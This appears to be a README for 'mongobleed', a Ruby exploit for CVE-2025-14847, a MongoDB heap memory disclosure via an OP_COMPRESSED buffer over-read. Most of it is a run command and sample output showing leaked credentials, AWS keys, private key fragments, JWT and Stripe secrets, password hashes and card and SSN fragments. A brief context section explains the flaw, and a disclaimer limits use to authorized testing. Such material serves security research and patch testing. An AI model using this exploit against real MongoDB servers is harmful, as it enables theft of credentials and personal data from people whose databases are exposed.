# mongobleed

[CVE-2025-14847](https://github.com/advisories/GHSA-4742-mr57-2r9j) exploit for MongoDB heap memory disclosure via OP_COMPRESSED buffer over-read.

## Usage

```bash
$ bundle install
$ bundle exec ruby mongobleed.rb --host 10.0.2.15 --port 27017 --min-offset 20 --max-offset 8192 --output leaked.bin

============================================================
  Mongobleed - CVE-2025-14847 MongoDB Memory Leak
  Author: Demetrius Ford - github.com/demetriusford
============================================================

[*] Target: 10.0.2.15:27017
[*] Offset range: 20 to 8192
[*] Starting memory scan...

[+] Offset 0089 | Size:   14 bytes | ismaster????
[+] Offset 0124 | Size:   37 bytes | ??_id??ObjectId("6721a3f8b2c4e5d6f7a8b9c0")
[+] Offset 0203 | Size:   52 bytes | mongodb://appuser:Pr0d_M0ng0_2024!@cluster0.mongodb.net
[+] Offset 0287 | Size:   16 bytes | admin??customers
[+] Offset 0344 | Size:   28 bytes | ?saslSupportedMechs?SCRAM-S
[+] Offset 0412 | Size:   41 bytes | {"mechanism":"SCRAM-SHA-256","user":"dbAdmin
[+] Offset 0509 | Size:   19 bytes | ??localThresholdMS?
[+] Offset 0678 | Size:   64 bytes | AWS_ACCESS_KEY_ID=AKIAVRUVQGZA7EXAMPLE9??AWS_SECRET_ACCESS_KEY=wJ
[+] Offset 0891 | Size:   38 bytes | alrKV9+OxPjQ3zDh8EXAMPLE1a2b3c4d5e6f7g8
[+] Offset 0956 | Size:   22 bytes | ??operationTime????
[+] Offset 1034 | Size:   47 bytes | client??driver??name?MongoDB Internal Client??v
[+] Offset 1187 | Size:   29 bytes | clusterTime??signature??hash
[+] Offset 1256 | Size:   58 bytes | -----BEGIN RSA PRIVATE KEY-----??MIIEowIBAAKCAQEA2f
[+] Offset 1398 | Size:   31 bytes | 9xK7mZjp+EXAMPLE+KEY+DATA+HERE
[+] Offset 1534 | Size:   44 bytes | ??authSource=admin&replicaSet=atlas-prod-shard
[+] Offset 1702 | Size:   26 bytes | JWT_SECRET=d8f2a91b7c3e4
[+] Offset 1819 | Size:   35 bytes | ??email??jsmith@acmecorp.com??role?
[+] Offset 1967 | Size:   18 bytes | ??passwordHash??$2b
[+] Offset 2103 | Size:   42 bytes | $12$rK8xJ2pL.N7mQvYsU3wXeO9Df4HgI5jKlMnO
[+] Offset 2287 | Size:   33 bytes | ??sessions????lastUse????txnNumb
[+] Offset 2456 | Size:   51 bytes | MONGO_INITDB_ROOT_PASSWORD=xt7Gh!92kLpQz@mongodb_adm
[+] Offset 2634 | Size:   27 bytes | ??creditCard??4532????8721
[+] Offset 2891 | Size:   24 bytes | ??ssn??XXX-XX-4532????ho
[+] Offset 3102 | Size:   39 bytes | stripe_sk_live_51H7xKLExample8q9RtY2vN
[+] Offset 3344 | Size:   16 bytes | ??cursorId??????
[+] Offset 3512 | Size:   48 bytes | ENCRYPTION_KEY=aGVsbG93b3JsZHRoaXNpc2FiYXNlNjRr

============================================================
[*] Scan complete!

[*] Total leaked data: 6847 bytes
[*] Unique fragments: 312
[*] Output saved to: leaked.bin

------------------------------------------------------------
[!] Scanning for sensitive patterns...
------------------------------------------------------------
[!] Potential secret detected: PASSWORD
[!] Potential secret detected: SECRET
[!] Potential secret detected: KEY
[!] Potential secret detected: ADMIN
[!] Potential secret detected: AKIA
------------------------------------------------------------
```

## Context

Exploits insufficient validation of `uncompressed_size` in MongoDB's `OP_COMPRESSED` handler. The BSON parser reads beyond message boundaries into heap memory, leaking data through error messages.

Options: `--host`, `--port`, `--min-offset`, `--max-offset`, `--output`

## Disclaimer

For authorized security testing only. Based on research by Joe Desimone ([@dez_](https://x.com/dez_))
